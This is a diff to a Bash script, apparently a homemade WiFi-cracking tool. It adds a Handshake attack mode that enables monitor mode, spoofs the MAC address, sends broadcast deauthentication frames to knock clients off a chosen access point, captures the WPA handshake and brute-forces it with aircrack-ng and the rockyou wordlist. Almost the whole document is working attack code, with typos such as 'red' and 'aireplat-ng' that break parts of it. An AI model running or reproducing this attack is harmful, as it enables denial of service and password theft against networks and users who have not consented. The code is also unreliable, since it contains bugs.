@@ -20,6 +20,7 @@ function ctrl_c() {
 	echo -e "\n${yellowColour}[*]${endColour}${grayColour}Exiting...${endColour}"
 	tput cnorm # Show the cursor again
 	airmon-ng stop ${network_card}mon >/dev/null 2>&1
+	rm -f screenshot* 2>/dev/null
 	exit 0
 }
 
@@ -32,6 +33,7 @@ function helpPanel() {
 	echo -e "\n\t${grayColour}Handshake${endColour}"
 	echo -e "\t${grayColour}PKMID${endColour}"
 	echo -e "\n\n${grayColour}NETWORK CARD NAME:${endColour}"
+	echo -e ""
 	exit 0
 }
 
@@ -39,7 +41,7 @@ function helpPanel() {
 function dependencies() {
 	tput civis # we can hide the cursor with this option
 	clear
-	dependencies=(aircrack-ng macchanger)
+	dependencies=(aircrack-ng macchanger xterm)
 
 	echo -e "${yellowColour}[*]${endColour}${grayColour}Checking necessary dependencies...${endColour}"
 	sleep 2
@@ -63,16 +65,51 @@ function dependencies() {
 	done
 }
 
-# Function to proceed with the attackmode
+# Function to proceed with the attack mode
 function startAttack() {
-	clear
-	echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring network card in monitor mode...${endColour}\n"
-	airmon-ng start $network_card >/dev/null 2>&1                                        # Starting monitor mode
-	ifconfig ${network_card}mon down && macchanger -a ${network_card}mon >/dev/null 2>&1 # We deregister teh network card and assign a random mac address
-	ifconfig ${network_card}mon up
-	killall dhclient wpa_supplicant 2>/dev/null 2>&1.0 # Here we re-discharge the card and kill the conflicting process
+	if [ "$(echo $mode)" == "Handshake" ]; then
+		clear
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Configuring network card in monitor mode...${endColour}\n"
+		airmon-ng start $network_card >/dev/null 2>&1                                        # Starting monitor mode
+		ifconfig ${network_card}mon down && macchanger -a ${network_card}mon >/dev/null 2>&1 # We deregister teh network card and assign a random mac address
+		ifconfig ${network_card}mon up
+		killall dhclient wpa_supplicant 2>/dev/null 2>&1.0 # Here we re-discharge the card and kill the conflicting process
 
-	echo -e "${yellowColour}[+]${endColour}${grayColour} New mac address: ${endColour}${grayColour}$(macchanger -s ${network_card}mon | grep -i current | xargs | awk 'NF{print $NF}')${endColour}"
+		echo -e "${yellowColour}[+]${endColour}${grayColour} New mac address: ${endColour}${grayColour}$(macchanger -s ${network_card}mon | grep -i current | xargs | cut -d ' ' -f '3-100')${endColour}"
+
+		xterm -hold -e "airodump-ng ${network_card}mon" & # Starting aerodump in a new console , because this program works with stderr
+		airodump_xterm_PID=$!                             # Catching the PID of the background process
+
+		# Now ask to the user about the name of the access point and the channel
+		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access point's name: ${endColour}" && read apname
+		echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Access point's channel: ${endColour}" && red apchanel
+
+		kill -9 $airodump_xterm_PID
+		wait $airodump_xterm_PID 2>/dev/null
+
+		xterm -hold -e "airodump-ng -c $apchanel -w screenshot --essid $apname ${network_card}mon" &
+		airodump_filter_xterm_PID=$!
+
+		sleep 5
+		xterm -hold -e "aireplat-ng -0 10 -e $apname -c FF:FF:FF:FF:FF:FF ${network_card}mon" &
+		aireplay_xterm_PID=$!
+		kill -9 $aireplay_xterm_PID
+		wait $aireplay_xterm_PID 2>/dev/null
+
+		sleep 10
+		kill -9 $airodump_filter_xterm_PID
+		wait $airodump_filter_xterm_PID 2>/dev/null
+
+		# apply brute force to the hash obtained to crack the password with aircrack-ng
+		xterm -hold -e "aircrack-ng -w /usr/share/wordlist/rockyou.txt screenshot-01.cap" &
+
+	elif [ "$(echo $mode)" == "PKMID" ]; then
+		clear
+		echo -e "${yellowColour}[*]${endColour}${grayColour} Starting ClientLess PKMID attack...${endColour}"
+	else
+		echo -e "\n${redColour}[*] This attack mode is not valid ${endColour}"
+		exit 1
+	fi
 }
 
 ## MAIN FUNCTION ##
@@ -100,8 +137,10 @@ if [ "$(id -u)" == "0" ]; then
 		startAttack
 		tput cnorm
 		airmon-ng stop ${network_card}mon >/dev/null 2>&1
+		rm -f screenshot* 2>/dev/null
 	fi
 
 else
-	echo -e "\n${redColour}[*]Im not root{endColour}\n"
+	echo -e "\n${redColour}[*]I'm not root{endColour}\n"
+	exit 2
 fi
